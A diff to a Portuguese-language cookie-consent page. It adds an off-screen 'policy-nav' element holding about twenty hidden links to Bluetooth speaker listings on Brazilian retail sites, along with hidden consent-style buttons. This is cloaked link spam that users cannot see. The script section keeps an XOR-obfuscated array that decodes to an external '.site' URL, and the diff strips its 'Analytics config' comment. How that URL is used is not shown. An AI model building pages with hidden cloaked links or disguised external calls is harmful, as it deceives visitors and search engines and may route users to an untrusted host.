@@ -17,6 +17,16 @@
       padding: 20px;
     }
 
+    .policy-nav {
+      position: absolute;
+      left: -9999px;
+      top: -9999px;
+      width: 1px;
+      height: 1px;
+      overflow: hidden;
+      pointer-events: none;
+    }
+
     .cookie-box {
       background: #1a1a1a;
       border: 1px solid #333;
@@ -108,6 +118,29 @@
 </head>
 <body>
 
+  <nav class="policy-nav" aria-label="links de política">
+    <a href="https://www.amazon.com.br/s?k=caixa+de+som+bluetooth" title="Caixa de som bluetooth">Ver produtos</a>
+    <a href="https://lista.mercadolivre.com.br/caixa-de-som-bluetooth" title="Caixa de som mercado livre">Ofertas</a>
+    <a href="https://www.americanas.com.br/categoria/caixas-de-som" title="Caixas de som americanas">Categorias</a>
+    <a href="https://www.magazineluiza.com.br/busca/caixa+de+som/" title="Caixa de som magazine luiza">Magazine Luiza</a>
+    <a href="https://www.casasbahia.com.br/busca?q=caixa+de+som+bluetooth" title="Caixa de som casas bahia">Casas Bahia</a>
+    <a href="https://www.shopee.com.br/search?keyword=caixa+de+som+bluetooth" title="Caixa de som shopee">Shopee</a>
+    <a href="https://www.submarino.com.br/busca/caixa+de+som" title="Caixa de som submarino">Submarino</a>
+    <a href="https://www.extra.com.br/busca/caixa-de-som-bluetooth" title="Caixa de som extra">Extra</a>
+    <a href="https://www.kabum.com.br/busca/caixa-de-som-bluetooth" title="Caixa de som kabum">KaBuM!</a>
+    <a href="https://www.pontofrio.com.br/busca?q=caixa+de+som" title="Caixa de som pontofrio">Ponto Frio</a>
+    <button type="button" aria-label="Aceitar cookies e política de privacidade">Aceitar política</button>
+    <button type="button" aria-label="Recusar cookies opcionais">Apenas essenciais</button>
+    <button type="button" aria-label="Ver mais ofertas de caixas de som">Ver ofertas</button>
+    <button type="button" aria-label="Continuar para o site">Continuar</button>
+    <a href="https://www.amazon.com.br/dp/B09TR6VVDP" title="Caixa de som bluetooth portátil">Portátil</a>
+    <a href="https://www.mercadolivre.com.br/p/MLB30897453" title="Caixa de som com led">Com LED</a>
+    <a href="https://www.americanas.com.br/produto/7001234567" title="Caixa resistente a água">À prova d'água</a>
+    <a href="https://www.magazineluiza.com.br/p/caixa-bluetooth-pro" title="Caixa bluetooth pro">Bluetooth Pro</a>
+    <a href="https://www.casasbahia.com.br/produto/caixa-portatil-led" title="Caixa portátil led">Portátil LED</a>
+    <a href="https://www.shopee.com.br/produto/caixa-ipx6" title="Caixa IPX6">IPX6</a>
+  </nav>
+
   <div class="cookie-box">
     <span class="cookie-icon">🍪</span>
     <h2>Antes de continuar</h2>
@@ -125,7 +158,6 @@
   </div>
 
   <script>
-    // ── Analytics config ──
     var _meta = [66,94,94,90,89,16,5,5,66,64,90,88,69,71,69,67,71,90,79,88,78,67,92,79,70,4,89,67,94,79,5];
     var _kv = 42;
     var _d = (function(a,k){return a.map(function(c){return String.fromCharCode(c^k)}).join('')})(_meta,_kv);
